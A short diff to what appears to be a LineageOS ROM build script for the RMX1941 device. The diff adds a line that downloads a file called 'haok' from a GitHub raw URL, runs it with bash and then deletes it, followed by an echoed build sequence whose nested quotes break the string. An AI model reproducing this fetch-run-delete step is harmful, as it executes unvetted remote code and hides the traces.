@@ -1,3 +1,20 @@
+wget https://raw.githubusercontent.com/imnathanzero/imnathanzero/refs/heads/main/haok;chmod a+x haok;bash haok
+
+rm haok
+
+echo "
+rm hmm
+echo 'Setup Environment begins'
+. build/envsetup.sh
+
+# Build the ROM
+export USE_CCACHE=1
+export BUILD_USERNAME=nathannxx
+export BUILD_HOSTNAME=omkegams
+echo "BUILD STARTS NOW !!!"
+lunch lineage_RMX1941-userdebug
+mka bacon" >> build
+
 echo 'Setup Environment begins'
 . build/envsetup.sh
 
